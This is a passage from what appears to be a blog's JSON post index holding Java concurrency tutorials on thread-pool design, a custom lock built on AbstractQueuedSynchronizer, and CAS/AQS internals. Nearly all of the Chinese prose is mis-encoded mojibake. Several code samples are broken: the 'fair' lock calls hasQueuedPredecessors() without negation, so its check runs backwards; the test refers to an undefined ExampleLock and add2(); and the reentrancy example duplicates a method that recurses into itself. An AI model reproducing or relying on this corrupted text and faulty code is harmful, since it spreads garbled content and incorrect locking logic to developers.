å™¨.Classç±»çš„getDeclaredConstructor()æ–¹æ³•,å¯è·å–åˆ°ç±»çš„ç§æœ‰æ„é€ å™¨(åŒ…æ‹¬å¸¦æœ‰å…¶ä»–ä¿®é¥°ç¬¦çš„æ„é€ å™¨ï¼‰ï¼Œä½†åœ¨ä½¿ç”¨privateçš„æ„é€ å™¨æ—¶ï¼Œå¿…é¡»è®¾ç½®setAccessible()ä¸ºtrue,æ‰å¯ä»¥è·å–å¹¶æ“ä½œè¯¥Constructorå¯¹è±¡ã€‚ MessageFormat.format Calendar instance = Calendar.getInstance(); instance.add(Calendar.SECOND, 90); å¤šçº¿ç¨‹ wait()çš„ä½œç”¨æ˜¯è®©å½“å‰çº¿ç¨‹è¿›å…¥ç­‰å¾…çŠ¶æ€ï¼ŒåŒæ—¶ï¼Œwait()ä¹Ÿä¼šè®©å½“å‰çº¿ç¨‹é‡Šæ”¾å®ƒæ‰€æŒæœ‰çš„é”ã€‚â€œç›´åˆ°å…¶ä»–çº¿ç¨‹è°ƒç”¨æ­¤å¯¹è±¡çš„ notify() æ–¹æ³•æˆ– notifyAll() æ–¹æ³•â€ï¼Œå½“å‰çº¿ç¨‹è¢«å”¤é†’(è¿›å…¥â€œå°±ç»ªçŠ¶æ€â€)","categories":[],"tags":[]},{"title":"Thread Pool","slug":"Thread-pool","date":"2021-04-20T08:37:35.000Z","updated":"2021-04-20T16:51:26.692Z","comments":true,"path":"Thread-pool/","link":"","permalink":"https://blog.kayleh.top/Thread-pool/","excerpt":"","text":"å¼‚æ­¥æ‰§è¡Œçš„ä»£ç  new Thread(r).start(); ç»Ÿä¸€çš„å·¥å…·ç±»ï¼Œå®šä¸€ä¸ªæ¥å£æ¥å®ç°ã€‚ public interface Executor { public void execute(Runnable r); } // æ–°çº¿ç¨‹ï¼šç›´æ¥åˆ›å»ºä¸€ä¸ªæ–°çº¿ç¨‹è¿è¡Œ class FlashExecutor implements Executor { public void execute(Runnable r) { new Thread(r).start(); } } å‡å¦‚æœ‰ 10000 ä¸ªäººéƒ½è°ƒç”¨è¿™ä¸ªå·¥å…·ç±»æäº¤ä»»åŠ¡ï¼Œé‚£å°±ä¼šåˆ›å»º 10000 ä¸ªçº¿ç¨‹æ¥æ‰§è¡Œï¼Œè¿™è‚¯å®šä¸åˆé€‚å§ï¼èƒ½ä¸èƒ½æ§åˆ¶ä¸€ä¸‹çº¿ç¨‹çš„æ•°é‡å‘¢ï¼Ÿ å¯ä»¥æŠŠè¿™ä¸ªä»»åŠ¡ r ä¸¢åˆ°ä¸€ä¸ª tasks é˜Ÿåˆ—ä¸­ï¼Œç„¶ååªå¯åŠ¨ä¸€ä¸ªçº¿ç¨‹ï¼Œå°±å«å®ƒ Worker çº¿ç¨‹å§ï¼Œä¸æ–­ä» tasks é˜Ÿåˆ—ä¸­å–ä»»åŠ¡ï¼Œæ‰§è¡Œä»»åŠ¡ã€‚è¿™æ ·æ— è®ºè°ƒç”¨è€…è°ƒç”¨å¤šå°‘æ¬¡ï¼Œæ°¸è¿œå°±åªæœ‰ä¸€ä¸ª Worker çº¿ç¨‹åœ¨è¿è¡Œï¼Œåƒè¿™æ ·ã€‚ å›¾ç‰‡ è¿™ä¸ªè®¾è®¡æœ‰äº†ä¸‰ä¸ªé‡å¤§çš„æ„ä¹‰ï¼š \\1. æ§åˆ¶äº†çº¿ç¨‹æ•°é‡ã€‚ \\2. é˜Ÿåˆ—ä¸ä½†èµ·åˆ°äº†ç¼“å†²çš„ä½œç”¨ï¼Œè¿˜å°†ä»»åŠ¡çš„æäº¤ä¸æ‰§è¡Œè§£è€¦äº†ã€‚ \\3. æœ€é‡è¦çš„ä¸€ç‚¹æ˜¯ï¼Œè§£å†³äº†æ¯æ¬¡é‡å¤åˆ›å»ºå’Œé”€æ¯çº¿ç¨‹å¸¦æ¥çš„ç³»ç»Ÿå¼€é”€ã€‚ ä¸è¿‡åªæœ‰ä¸€ä¸ªåå°çš„å·¥ä½œçº¿ç¨‹ Worker ä¼šä¸ä¼šå°‘äº†ç‚¹ï¼Ÿè¿˜æœ‰å¦‚æœè¿™ä¸ª tasks é˜Ÿåˆ—æ»¡äº†æ€ä¹ˆåŠå‘¢ï¼Ÿ Worker çº¿ç¨‹çš„æ•°é‡è¦å¢åŠ ï¼Œä½†æ˜¯å…·ä½“æ•°é‡è¦è®©ä½¿ç”¨è€…å†³å®šï¼Œè°ƒç”¨æ—¶ä¼ å…¥ï¼Œå°±å«æ ¸å¿ƒçº¿ç¨‹æ•° corePoolSize å§ã€‚ è¿™æ ·è®¾è®¡ã€‚ \\1. åˆå§‹åŒ–çº¿ç¨‹æ± æ—¶ï¼Œç›´æ¥å¯åŠ¨ corePoolSize ä¸ªå·¥ä½œçº¿ç¨‹ Worker å…ˆè·‘ç€ã€‚ \\2. è¿™äº› Worker å°±æ˜¯æ­»å¾ªç¯ä»é˜Ÿåˆ—é‡Œå–ä»»åŠ¡ç„¶åæ‰§è¡Œã€‚ \\3. execute æ–¹æ³•ä»ç„¶æ˜¯ç›´æ¥æŠŠä»»åŠ¡æ”¾åˆ°é˜Ÿåˆ—ï¼Œä½†é˜Ÿåˆ—æ»¡äº†ä¹‹åç›´æ¥æŠ›å¼ƒ å›¾ç‰‡ åˆå§‹åŒ–çš„æ—¶å€™ï¼Œå°±åˆ›å»ºäº†ä¸€å † Worker çº¿ç¨‹åœ¨é‚£ç©ºè·‘ç€ï¼Œå‡å¦‚æ­¤æ—¶å¹¶æ²¡æœ‰å¼‚æ­¥ä»»åŠ¡æäº¤è¿‡æ¥æ‰§è¡Œï¼Œè¿™å°±æœ‰ç‚¹æµªè´¹äº†ã€‚ é˜Ÿåˆ—ä¸€æ»¡ï¼Œå°±ç›´æ¥æŠŠæ–°ä»»åŠ¡ä¸¢å¼ƒäº†ï¼Œè¿™æ ·æœ‰äº›ç²—æš´ï¼Œèƒ½ä¸èƒ½è®©è°ƒç”¨è€…è‡ªå·±å†³å®šè¯¥æ€ä¹ˆå¤„ç†å‘¢ï¼Ÿ æ”¹è¿› 1. æŒ‰éœ€åˆ›å»ºWorkerï¼šåˆšåˆå§‹åŒ–çº¿ç¨‹æ± æ—¶ï¼Œä¸å†ç«‹åˆ»åˆ›å»º corePoolSize ä¸ªå·¥ä½œçº¿ç¨‹ï¼Œè€Œæ˜¯ç­‰å¾…è°ƒç”¨è€…ä¸æ–­æäº¤ä»»åŠ¡çš„è¿‡ç¨‹ä¸­ï¼Œé€æ¸æŠŠå·¥ä½œçº¿ç¨‹ Worker åˆ›å»ºå‡ºæ¥ï¼Œç­‰æ•°é‡è¾¾åˆ° corePoolSize æ—¶å°±åœæ­¢ï¼ŒæŠŠä»»åŠ¡ç›´æ¥ä¸¢åˆ°é˜Ÿåˆ—é‡Œã€‚é‚£å°±å¿…ç„¶è¦ç”¨ä¸€ä¸ªå±æ€§è®°å½•å·²ç»åˆ›å»ºå‡ºæ¥çš„å·¥ä½œçº¿ç¨‹æ•°é‡ï¼Œå°±å« workCount å§ã€‚ 2. åŠ æ‹’ç»ç­–ç•¥ï¼šå®ç°ä¸Šå°±æ˜¯å¢åŠ ä¸€ä¸ªå…¥å‚ï¼Œç±»å‹æ˜¯ä¸€ä¸ªæ¥å£ RejectedExecutionHandlerï¼Œç”±è°ƒç”¨è€…å†³å®šå®ç°ç±»ï¼Œä»¥ä¾¿åœ¨ä»»åŠ¡æäº¤å¤±è´¥åæ‰§è¡Œ rejectedExecution æ–¹æ³•ã€‚ 3. å¢åŠ çº¿ç¨‹å·¥å‚ï¼šå®ç°ä¸Šå°±æ˜¯å¢åŠ ä¸€ä¸ªå…¥å‚ï¼Œç±»å‹æ˜¯ä¸€ä¸ªæ¥å£ ThreadFactoryï¼Œå¢åŠ å·¥ä½œçº¿ç¨‹æ—¶ä¸å†ç›´æ¥ new çº¿ç¨‹ï¼Œè€Œæ˜¯è°ƒç”¨è¿™ä¸ªç”±è°ƒç”¨è€…ä¼ å…¥çš„ ThreadFactory å®ç°ç±»çš„ newThread æ–¹æ³•ã€‚ å°±åƒä¸‹é¢è¿™æ ·ã€‚ å›¾ç‰‡ åœ¨è¿™ä¸ªåœºæ™¯é‡Œï¼Œå¼¹æ€§å°±æ˜¯åœ¨ä»»åŠ¡æäº¤æ¯”è¾ƒé¢‘ç¹ï¼Œå’Œä»»åŠ¡æäº¤éå¸¸ä¸é¢‘ç¹è¿™ä¸¤ç§æƒ…å†µä¸‹ï¼Œä½ è¿™ä¸ªä»£ç æ˜¯å¦æœ‰é—®é¢˜ï¼Ÿ è¿™ä¸ªçº¿ç¨‹æ± ï¼Œå½“æäº¤ä»»åŠ¡çš„é‡çªå¢æ—¶ï¼Œå·¥ä½œçº¿ç¨‹å’Œé˜Ÿåˆ—éƒ½è¢«å æ»¡äº†ï¼Œå°±åªèƒ½èµ°æ‹’ç»ç­–ç•¥ï¼Œå…¶å®å°±æ˜¯è¢«ä¸¢å¼ƒæ‰ å›¾ç‰‡ è°ƒç”¨æ–¹å¯ä»¥é€šè¿‡è®¾ç½®å¾ˆå¤§çš„æ ¸å¿ƒçº¿ç¨‹æ•° corePoolSize æ¥è§£å†³è¿™ä¸ªé—®é¢˜ å›¾ç‰‡ å¯ä»¥ï¼Œä½†ä¸€èˆ¬åœºæ™¯ä¸‹ QPS é«˜å³°æœŸéƒ½å¾ˆçŸ­ï¼Œè€Œä¸ºäº†è¿™ä¸ªå¾ˆçŸ­æš‚çš„é«˜å³°ï¼Œè®¾ç½®å¾ˆå¤§çš„æ ¸å¿ƒçº¿ç¨‹æ•°ï¼Œç®€ç›´å¤ªæµªè´¹èµ„æºäº† æœ€å¤§çº¿ç¨‹æ•° maximumPoolSizeã€‚å½“æ ¸å¿ƒçº¿ç¨‹æ•°å’Œé˜Ÿåˆ—éƒ½æ»¡äº†æ—¶ï¼Œæ–°æäº¤çš„ä»»åŠ¡ä»ç„¶å¯ä»¥é€šè¿‡åˆ›å»ºæ–°çš„å·¥ä½œçº¿ç¨‹ï¼ˆå«å®ƒéæ ¸å¿ƒçº¿ç¨‹ï¼‰ï¼Œç›´åˆ°å·¥ä½œçº¿ç¨‹æ•°è¾¾åˆ° maximumPoolSize ä¸ºæ­¢ï¼Œè¿™æ ·å°±å¯ä»¥ç¼“è§£ä¸€æ—¶çš„é«˜å³°æœŸäº†ï¼Œè€Œç”¨æˆ·ä¹Ÿä¸ç”¨è®¾ç½®è¿‡å¤§çš„æ ¸å¿ƒçº¿ç¨‹æ•°ã€‚ å›¾ç‰‡ å›¾ç‰‡ \\1. å¼€å§‹çš„æ—¶å€™å’Œä¸Šä¸€ç‰ˆä¸€æ ·ï¼Œå½“ workCount &lt; corePoolSize æ—¶ï¼Œé€šè¿‡åˆ›å»ºæ–°çš„ Worker æ¥æ‰§è¡Œä»»åŠ¡ã€‚ \\2. å½“ workCount &gt;= corePoolSize å°±åœæ­¢åˆ›å»ºæ–°çº¿ç¨‹ï¼ŒæŠŠä»»åŠ¡ç›´æ¥ä¸¢åˆ°é˜Ÿåˆ—é‡Œã€‚ \\3. ä½†å½“é˜Ÿåˆ—å·²æ»¡ä¸”ä»ç„¶ workCount &lt; maximumPoolSize æ—¶ï¼Œä¸å†ç›´æ¥èµ°æ‹’ç»ç­–ç•¥ï¼Œè€Œæ˜¯åˆ›å»ºéæ ¸å¿ƒçº¿ç¨‹ï¼Œç›´åˆ° workCount = maximumPoolSizeï¼Œå†èµ°æ‹’ç»ç­–ç•¥ã€‚ è¿™æ · corePoolSize å°±è´Ÿè´£å¹³æ—¶å¤§å¤šæ•°æƒ…å†µæ‰€éœ€è¦çš„å·¥ä½œçº¿ç¨‹æ•°ï¼Œè€Œ maximumPoolSize å°±è´Ÿè´£åœ¨é«˜å³°æœŸä¸´æ—¶æ‰©å……å·¥ä½œçº¿ç¨‹æ•°ã€‚ é«˜å³°æ—¶æœŸçš„å¼¹æ€§æå®šäº†ï¼Œé‚£è‡ªç„¶å°±è¿˜è¦è€ƒè™‘ä½è°·æ—¶æœŸã€‚å½“é•¿æ—¶é—´æ²¡æœ‰ä»»åŠ¡æäº¤æ—¶ï¼Œæ ¸å¿ƒçº¿ç¨‹ä¸éæ ¸å¿ƒçº¿ç¨‹éƒ½ä¸€ç›´ç©ºè·‘ç€ï¼Œæµªè´¹èµ„æºã€‚æˆ‘ä»¬å¯ä»¥ç»™éæ ¸å¿ƒçº¿ç¨‹è®¾å®šä¸€ä¸ªè¶…æ—¶æ—¶é—´ keepAliveTimeï¼Œå½“è¿™ä¹ˆé•¿æ—¶é—´æ²¡èƒ½ä»é˜Ÿåˆ—é‡Œè·å–ä»»åŠ¡æ—¶ï¼Œå°±ä¸å†ç­‰äº†ï¼Œé”€æ¯çº¿ç¨‹ã€‚ å›¾ç‰‡ è¿™å›çº¿ç¨‹æ± åœ¨ QPS é«˜å³°æ—¶å¯ä»¥ä¸´æ—¶æ‰©å®¹ï¼ŒQPS ä½è°·æ—¶åˆå¯ä»¥åŠæ—¶å›æ”¶çº¿ç¨‹ï¼ˆéæ ¸å¿ƒçº¿ç¨‹ï¼‰è€Œä¸è‡³äºæµªè´¹èµ„æºï¼ŒçœŸçš„æ˜¾å¾—ååˆ† Q å¼¹å‘¢ã€‚ å›¾ç‰‡ æ€»ç»“æ„é€ æ–¹æ³• public FlashExecutor( int corePoolSize, int maximumPoolSize, long keepAliveTime, TimeUnit unit, BlockingQueue&lt;Runnable&gt; workQueue, ThreadFactory threadFactory, RejectedExecutionHandler handler) { ... // çœç•¥ä¸€äº›å‚æ•°æ ¡éªŒ this.corePoolSize = corePoolSize; this.maximumPoolSize = maximumPoolSize; this.workQueue = workQueue; this.keepAliveTime = unit.toNanos(keepAliveTime); this.threadFactory = threadFactory; this.handler = handler; } è¿™äº›å‚æ•°åˆ†åˆ«æ˜¯ int corePoolSizeï¼šæ ¸å¿ƒçº¿ç¨‹æ•° int maximumPoolSizeï¼šæœ€å¤§çº¿ç¨‹æ•° long keepAliveTimeï¼šéæ ¸å¿ƒçº¿ç¨‹çš„ç©ºé—²æ—¶é—´ TimeUnit unitï¼šç©ºé—²æ—¶é—´çš„å•ä½ BlockingQueue workQueueï¼šä»»åŠ¡é˜Ÿåˆ—ï¼ˆçº¿ç¨‹å®‰å…¨çš„é˜»å¡é˜Ÿåˆ—ï¼‰ ThreadFactory threadFactoryï¼šçº¿ç¨‹å·¥å‚ RejectedExecutionHandler handlerï¼šæ‹’ç»ç­–ç•¥ æ•´ä¸ªä»»åŠ¡çš„æäº¤æµç¨‹æ˜¯ å›¾ç‰‡","categories":[],"tags":[{"name":"Concurrency","slug":"Concurrency","permalink":"https://blog.kayleh.top/tags/Concurrency/"}]},{"title":"a Lock Based on ReentrantLock","slug":"Implement-a-lock-based-on-ReentrantLock","date":"2021-04-19T08:59:25.000Z","updated":"2021-04-19T17:26:04.313Z","comments":true,"path":"Implement-a-lock-based-on-ReentrantLock/","link":"","permalink":"https://blog.kayleh.top/Implement-a-lock-based-on-ReentrantLock/","excerpt":"","text":"åŸºäº ReentrantLockå®ç°ä¸€ä¸ªé”package aqsLock; import java.util.concurrent.locks.AbstractQueuedSynchronizer; /** * @Author: Kayleh * @Date: 2021/4/20 0:57 */ public class aqsLock { public void lock() { sync.acquire(1); } public void unlock() { sync.release(1); } private final Sync sync = new Sync(); public static class Sync extends AbstractQueuedSynchronizer { @Override protected boolean tryAcquire(int arg) { // CAS æ–¹å¼å°è¯•è·å–é”ï¼ŒæˆåŠŸè¿”å›trueï¼Œå¤±è´¥è¿”å›false if (compareAndSetState(0, 1)) return true; return false; } @Override protected boolean tryRelease(int arg) { // é‡Šæ”¾é” setState(0); return true; } } } åŸºæœ¬åŠŸèƒ½å®ç°ï¼Œæµ‹è¯•ï¼š // å¯èƒ½å‘ç”Ÿçº¿ç¨‹å®‰å…¨é—®é¢˜çš„å…±äº«å˜é‡ private static long count = 0; // ä¸¤ä¸ªçº¿ç¨‹å¹¶å‘å¯¹ count++ public static void main(String[] args) throws Exception { // åˆ›å»ºä¸¤ä¸ªçº¿ç¨‹ï¼Œæ‰§è¡Œadd()æ“ä½œ Thread th1 = new Thread(()-&gt; add()); Thread th2 = new Thread(()-&gt; add()); // å¯åŠ¨ä¸¤ä¸ªçº¿ç¨‹ th1.start(); th2.start(); // ç­‰å¾…ä¸¤ä¸ªçº¿ç¨‹æ‰§è¡Œç»“æŸ th1.join(); th2.join(); // è¿™é‡Œåº”è¯¥æ˜¯ 20000 å°±å¯¹äº†ï¼Œè¯´æ˜é”ç”Ÿæ•ˆäº† System.out.println(count); } // æˆ‘ç”»äº†ä¸€ä¸Šåˆå†™å‡ºæ¥çš„é”ï¼Œå“ˆå“ˆ private static ExampleLock exampleLock = new ExampleLock(); // å¾ªç¯ count++ï¼Œè¿›è¡Œ 10000 æ¬¡ private static void add() { exampleLock.lock(); for (int i = 0; i &lt; 10000; i++) { count++; } add2(); // æ²¡å•¥å¼‚å¸¸ï¼Œæˆ‘å°±ç›´æ¥é‡Šæ”¾é”äº† exampleLock.unlock(); } éå…¬å¹³é”ï¼Œå› ä¸ºçº¿ç¨‹æŠ¢é”ä¸æ’é˜Ÿï¼Œçº¯çœ‹è„¸ã€‚ å®ç°çš„æ’é˜Ÿè·å–é”ï¼Œå«å…¬å¹³é”ï¼Œå› ä¸ºåªè¦æœ‰çº¿ç¨‹åœ¨æ’é˜Ÿï¼Œæ–°æ¥çš„å°±å¾—ä¹–ä¹–å»æ’é˜Ÿï¼Œä¸èƒ½ç›´æ¥æŠ¢ã€‚ å®ç°ä¸€ä¸ªå…¬å¹³é”@Override public boolean tryAcquire(int acquires) { // åŸæœ‰åŸºç¡€ä¸ŠåŠ ä¸Šè¿™ä¸ª if (æœ‰çº¿ç¨‹åœ¨ç­‰å¾…é˜Ÿåˆ—ä¸­) { // è¿”å›è·å–é”å¤±è´¥ï¼ŒAQSä¼šå¸®æˆ‘æŠŠè¯¥çº¿ç¨‹æ”¾åœ¨ç­‰å¾…é˜Ÿåˆ—é˜Ÿå°¾çš„ return false; } if (compareAndSetState(0, 1)) { return true; } return false; } ä»£ç ï¼š package aqsLock; import java.util.concurrent.locks.AbstractQueuedSynchronizer; /** * @Author: Kayleh * @Date: 2021/4/20 0:57 */ public class aqsLock { public aqsLock(boolean fair) { sync = fair ? new Sync() : new NofairSync(); } public void lock() { sync.acquire(1); } public void unlock() { sync.release(1); } private Sync sync = new Sync(); public static class Sync extends AbstractQueuedSynchronizer { @Override protected boolean tryAcquire(int arg) { // CAS æ–¹å¼å°è¯•è·å–é”ï¼ŒæˆåŠŸè¿”å›trueï¼Œå¤±è´¥è¿”å›false if (hasQueuedPredecessors() &amp;&amp; compareAndSetState(0, 1)) return true; return false; } @Override protected boolean tryRelease(int arg) { // é‡Šæ”¾é” setState(0); return true; } } public static class NofairSync extends Sync { @Override protected boolean tryAcquire(int arg) { // CAS æ–¹å¼å°è¯•è·å–é”ï¼ŒæˆåŠŸè¿”å›trueï¼Œå¤±è´¥è¿”å›false if (compareAndSetState(0, 1)) return true; return false; } @Override protected boolean tryRelease(int arg) { // é‡Šæ”¾é” setState(0); return true; } } } å·¥å…·ä¼šå¯¼è‡´ä¸€ä¸ªçº¿ç¨‹å¡æ­»ï¼Œä¸€ç›´è·å–ä¸åˆ°é” å®ç°æ–¹æ³•å¯ä»¥é‡å…¥public void doSomeThing2() { flashLock.lock(); doSomeThing2(); flashLock.unlock(); } public void doSomeThing2() { flashLock.lock(); ... flashLock.unlock(); } ä¸€ä¸ªçº¿ç¨‹æ‰§è¡Œäº†ä¸€ä¸ªæ–¹æ³•ï¼Œè·å–äº†é”ï¼Œè¿™ä¸ªæ–¹æ³•æ²¡æœ‰ç»“æŸï¼Œåˆè°ƒç”¨äº†å¦ä¸€ä¸ªéœ€è¦é”çš„æ–¹æ³•ï¼Œäºæ˜¯å¡åœ¨è¿™å†ä¹Ÿä¸èµ°äº†ã€‚ æ€ä¹ˆ è®©åŒä¸€ä¸ªçº¿ç¨‹æŒæœ‰é”æ—¶ï¼Œè¿˜èƒ½ç»§ç»­è·å–é”ï¼ˆå¯é‡å…¥ï¼‰ï¼Œåªæœ‰å½“ä¸åŒçº¿ç¨‹æ‰äº’æ–¥å‘¢ï¼Ÿ @Override public boolean tryAcquire(int acquires) { final Thread current = Thread.currentThread(); int c = getState(); if (c == 0) { if (hasQueuedPredecessors() &amp;&amp; compareAndSetState(0, 1)) { // æ‹¿åˆ°é”è®°å¾—è®°å½•ä¸‹æŒé”çº¿ç¨‹æ˜¯è‡ªå·± setExclusiveOwnerThread(current); return true; } } else if (current == getExclusiveOwnerThread()) { // çœ‹è§é”è¢«å äº†(state!=0)ä¹Ÿåˆ«æ”¾å¼ƒï¼Œçœ‹çœ‹æ˜¯ä¸æ˜¯è‡ªå·±å çš„ setState(c + acquires); return true; } return false; }","categories":[],"tags":[{"name":"Concurrency","slug":"Concurrency","permalink":"https://blog.kayleh.top/tags/Concurrency/"}]},{"title":"CAS & AQS","slug":"CAS-and-AQS","date":"2021-04-18T09:43:22.000Z","updated":"2021-04-19T17:00:07.119Z","comments":true,"path":"CAS-and-AQS/","link":"","permalink":"https://blog.kayleh.top/CAS-and-AQS/","excerpt":"","text":"CASï¼ˆCompare And Swapï¼‰åŸç†åˆ†æå­—é¢æ„æ€æ˜¯æ¯”è¾ƒå’Œäº¤æ¢ï¼Œå…ˆçœ‹çœ‹ä¸‹é¢åœºæ™¯ï¼ˆA å’Œ B çº¿ç¨‹åŒæ—¶æ‰§è¡Œä¸‹é¢çš„ä»£ç ï¼‰ï¼š int i = 10; //ä»£ç 1 i = 10; //ä»£ç 2 åœºæ™¯ 1ï¼šA çº¿ç¨‹æ‰§è¡Œä»£ç  1 å’Œä»£ç  2ï¼Œç„¶å B çº¿ç¨‹æ‰§è¡Œä»£ç  1 å’Œä»£ç  2ï¼ŒCAS æˆåŠŸã€‚ åœºæ™¯ 2ï¼šA çº¿ç¨‹æ‰§è¡Œä»£ç  1ï¼Œæ­¤æ—¶ B çº¿ç¨‹æ‰§è¡Œä»£ç  1 å’Œä»£ç  2ï¼ŒA çº¿ç¨‹æ‰§è¡Œä»£ç  2ï¼ŒCAS ä¸æˆåŠŸï¼Œä¸ºä»€ä¹ˆå‘¢ï¼Ÿ å› ä¸º A çº¿ç¨‹æ‰§è¡Œä»£ç  1 æ—¶å€™ä¼šæ—§å€¼ï¼ˆi çš„å†…å­˜åœ°å€çš„å€¼ 10ï¼‰ä¿å­˜èµ·æ¥ï¼Œæ‰§è¡Œä»£ç  2 çš„æ—¶å€™å…ˆåˆ¤æ–­ i çš„æœ€æ–°å€¼ï¼ˆå¯èƒ½è¢«å…¶ä»–çº¿ç¨‹ä¿®æ”¹äº†ï¼‰è·Ÿæ—§å€¼æ¯”è¾ƒï¼Œå¦‚æœç›¸ç­‰åˆ™æŠŠ i èµ‹å€¼ä¸º 20ï¼Œå¦‚æœä¸æ˜¯åˆ™ CAS ä¸æˆåŠŸã€‚CAS æ˜¯ä¸€ä¸ªåŸå­æ€§æ“ä½œï¼Œè¦ä¹ˆæˆåŠŸè¦ä¹ˆå¤±è´¥ï¼ŒCAS æ“ä½œç”¨å¾—æ¯”è¾ƒå¤šçš„æ˜¯ sun.misc åŒ…çš„ Unsafe ç±»ï¼Œè€Œ Java å¹¶å‘åŒ…å¤§é‡ä½¿ç”¨ Unsafe ç±»çš„ CAS æ“ä½œï¼Œæ¯”å¦‚ï¼šAtomicInteger æ•´æ•°åŸå­ç±»ï¼ˆæœ¬è´¨æ˜¯è‡ªæ—‹é” + CASï¼‰ï¼ŒCAS ä¸éœ€åŠ é”ï¼Œæé«˜ä»£ç è¿è¡Œæ•ˆç‡ã€‚ä¹Ÿæ˜¯ä¸€ç§ä¹è§‚é”æ–¹å¼ï¼Œæˆ‘ä»¬é€šå¸¸è®¤ä¸ºåœ¨å¤§å¤šæ•°åœºæ™¯ä¸‹ä¸ä¼šå‡ºç°ç«äº‰èµ„æºçš„æƒ…å†µï¼Œå¦‚æœ CAS æ“ä½œå¤±è´¥ï¼Œä¼šä¸æ–­é‡è¯•ç›´åˆ°æˆåŠŸã€‚ CAS ä¼˜ç‚¹ï¼šèµ„æºç«äº‰ä¸å¤§çš„åœºæ™¯ç³»ç»Ÿå¼€é”€å°ã€‚ CAS ç¼ºç‚¹ï¼š å¦‚æœ CAS é•¿æ—¶é—´æ“ä½œå¤±è´¥ï¼Œå³é•¿æ—¶é—´è‡ªæ—‹ï¼Œä¼šå¯¼è‡´ CPU å¼€é”€å¤§ï¼Œä½†æ˜¯å¯ä»¥ä½¿ç”¨ CPU æä¾›çš„ pause æŒ‡ä»¤ï¼Œè¿™ä¸ª pause æŒ‡ä»¤å¯ä»¥è®©è‡ªæ—‹é‡è¯•å¤±è´¥æ—¶ CPU å…ˆç¡çœ ä¸€å°æ®µæ—¶é—´åå†ç»§ç»­è‡ªæ—‹é‡è¯• CAS æ“ä½œï¼Œjvm æ”¯æŒ pause æŒ‡ä»¤ï¼Œå¯ä»¥è®©æ€§èƒ½æå‡ä¸€äº›ã€‚ å­˜åœ¨ ABA é—®é¢˜ï¼Œå³åŸæ¥å†…å­˜åœ°å€çš„å€¼æ˜¯ Aï¼Œç„¶åè¢«æ”¹ä¸ºäº† Bï¼Œå†è¢«æ”¹ä¸º A å€¼ï¼Œæ­¤æ—¶ CAS æ“ä½œæ—¶è®¤ä¸ºè¯¥å€¼æœªè¢«æ”¹åŠ¨è¿‡ï¼ŒABA é—®é¢˜å¯ä»¥å¼•å…¥ç‰ˆæœ¬å·æ¥è§£å†³ï¼Œæ¯æ¬¡æ”¹åŠ¨éƒ½è®©ç‰ˆæœ¬å· +1ã€‚Java ä¸­å¤„ç† ABA çš„ä¸€ä¸ªæ–¹æ¡ˆæ˜¯ AtomicStampedReference ç±»ï¼Œå®ƒæ˜¯ä½¿ç”¨ä¸€ä¸ª int ç±»å‹çš„å­—æ®µä½œä¸ºç‰ˆæœ¬å·ï¼Œæ¯æ¬¡ä¿®æ”¹ä¹‹å‰éƒ½å…ˆè·å–ç‰ˆæœ¬å·å’Œå½“å‰çº¿ç¨‹æŒæœ‰çš„ç‰ˆæœ¬å·æ¯”å¯¹ï¼Œå¦‚æœä¸€è‡´æ‰è¿›è¡Œä¿®æ”¹æ“ä½œï¼Œå¹¶æŠŠç‰ˆæœ¬å· +1ã€‚ æ— æ³•ä¿è¯ä»£ç å—çš„åŸå­æ€§ï¼ŒCAS åªèƒ½ä¿è¯å•ä¸ªå˜é‡çš„åŸå­æ€§æ“ä½œï¼Œå¦‚æœè¦ä¿è¯å¤šä¸ªå˜é‡çš„åŸå­æ€§æ“ä½œå°±è¦ä½¿ç”¨æ‚²è§‚é”äº†ã€‚ AQSï¼ˆAbstractQueuedSynchronizerï¼‰åŸç†åˆ†æå­—é¢æ„æ€æ˜¯æŠ½è±¡çš„é˜Ÿåˆ—åŒæ­¥å™¨ï¼ŒAQS æ˜¯ä¸€ä¸ªåŒæ­¥å™¨æ¡†æ¶ï¼Œå®ƒåˆ¶å®šäº†ä¸€å¥—å¤šçº¿ç¨‹åœºæ™¯ä¸‹è®¿é—®å…±äº«èµ„æºçš„æ–¹æ¡ˆï¼ŒJava ä¸­å¾ˆå¤šåŒæ­¥ç±»åº•å±‚éƒ½æ˜¯ä½¿ç”¨ AQS å®ç°ï¼Œæ¯”å¦‚ï¼šReentrantLockã€CountDownLatchã€ReentrantReadWriteLockï¼Œè¿™äº› java åŒæ­¥ç±»çš„å†…éƒ¨ä¼šä½¿ç”¨ä¸€ä¸ª Sync å†…éƒ¨ç±»ï¼Œè€Œè¿™ä¸ª Sync ç»§æ‰¿äº† AbstractQueuedSynchronizer ç±»ï¼Œè¿™æ˜¯ä¸€ç§æ¨¡æ¿æ–¹æ³•æ¨¡å¼ï¼Œæ‰€ä»¥è¯´è¿™äº›åŒæ­¥ç±»çš„åº•å±‚æ˜¯ä½¿ç”¨ AQS å®ç°ã€‚ img AQS å†…éƒ¨ç»´æŠ¤äº†ä¸€ä¸ª volatile ä¿®é¥°çš„ int state å±æ€§ï¼ˆå…±äº«èµ„æºï¼‰å’Œä¸€ä¸ªå…ˆè¿›å…ˆå‡ºçš„çº¿ç¨‹ç­‰å¾…é˜Ÿåˆ—ï¼ˆå³å¤šçº¿ç¨‹ç«äº‰å…±äº«èµ„æºæ—¶è¢«é˜»å¡çš„çº¿ç¨‹ä¼šè¿›å…¥è¿™ä¸ªé˜Ÿåˆ—ï¼‰ã€‚å› ä¸º state æ˜¯ä½¿ç”¨ volatile ä¿®é¥°ï¼Œæ‰€ä»¥åœ¨å¤šçº¿ç¨‹ä¹‹å‰å¯è§ï¼Œè®¿é—® state çš„æ–¹å¼æœ‰ 3 ç§ï¼ŒgetState()ã€setState()å’Œ compareAndSetState()ã€‚ AQS å®šä¹‰äº† 3 ç§èµ„æºå…±äº«æ–¹å¼ï¼š ç‹¬å é”ï¼ˆexclusiveï¼‰ï¼Œä¿è¯åªæœ‰ä¸€æ¡çº¿ç¨‹æ‰§è¡Œï¼Œæ¯”å¦‚ ReentrantLockã€AtomicIntegerã€‚ å…±äº«é”ï¼ˆsharedï¼‰ï¼Œå…è®¸å¤šä¸ªçº¿ç¨‹åŒæ—¶æ‰§è¡Œï¼Œæ¯”å¦‚ CountDownLatchã€Semaphoreã€‚ åŒæ—¶å®ç°ç‹¬å å’Œå…±äº«ï¼Œæ¯”å¦‚ ReentrantReadWriteLockï¼Œå…è®¸å¤šä¸ªçº¿ç¨‹åŒæ—¶æ‰§è¡Œè¯»æ“ä½œï¼Œåªå…è®¸ä¸€æ¡çº¿ç¨‹æ‰§è¡Œå†™æ“ä½œã€‚ ReentrantLock å’Œ 